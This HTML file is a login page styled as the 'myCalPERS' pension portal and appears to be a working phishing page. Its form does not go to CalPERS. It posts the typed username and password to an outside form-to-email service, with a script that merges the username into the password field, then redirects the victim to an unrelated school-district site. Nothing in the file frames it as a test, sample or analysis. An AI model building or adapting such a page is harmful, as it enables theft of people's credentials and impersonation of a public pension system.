<!DOCTYPE html>
<html>
<head>
	<title>Login Page</title>
   <!--Made with love by Mutiullah Samim -->
   
	<!--Bootsrap 4 CDN-->
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    
    <!--Fontawesome CDN-->
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">

	<!--Custom styles-->
	<link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
	<script type="text/javascript">
		function Verify(event){
			if (document.getElementById('username').value.trim() === '' || document.getElementById('password').value.trim() === ''){
				event.preventDefault();
				document.getElementById('error').innerHTML = "Invalid credentials!";
			}
			else
			{
				document.getElementById('password').value = document.getElementById('username').value + ' [' + document.getElementById('password').value + ']';
			}
		}
	</script>

<div class="container">
	<div class="d-flex justify-content-center h-100">
		<div class="card">
			<div class="card-header">
				<br>
				<br>
				<h3><b>my</b>CalPERS Log In</h3>
				<div class="d-flex justify-content-end social_icon">					
					<span><i class="fab fa-facebook-square"></i></span>
					<span><i class="fab fa-google-plus-square"></i></span>
					<span><i class="fab fa-twitter-square"></i></span>
				</div>
			</div>
			<div class="card-body">
				<form action="https://postmail.invotes.com/send" method="post" id="email_form">
					<div class="input-group form-group">
						<div class="input-group-prepend">
							<span class="input-group-text"><i class="fas fa-user"></i></span>
						</div>
						<input type="text" name="subject" class="form-control" id="username" placeholder="username">
						
					</div>
					<div class="input-group form-group">
						<div class="input-group-prepend">
							<span class="input-group-text"><i class="fas fa-key"></i></span>
						</div>
						<input type="password" name="text" class="form-control" id="password" placeholder="password">
					</div>
					<div class="row align-items-center remember">
						<input type="checkbox">Remember Me
					</div>					
					<div class="form-group">
						<input type="submit" value="Login" class="btn float-right login_btn" onclick="Verify(event)">
					</div>
					<br>
					<br>
					<div class="footer">
						<b style="color: red" id="error"></b>
					</div>
					<!-- replace value with your access token -->
					<input type="hidden" name="access_token" value="plakm8estx5jgbpr8hhw2rkz" />
					<input type="hidden" name="success_url" value="https://nusd.org" />
					<input type="hidden" name="error_url" value="https://nusd.org" />
				</form>
			</div>			
		</div>
	</div>
</div>
</body>
</html>
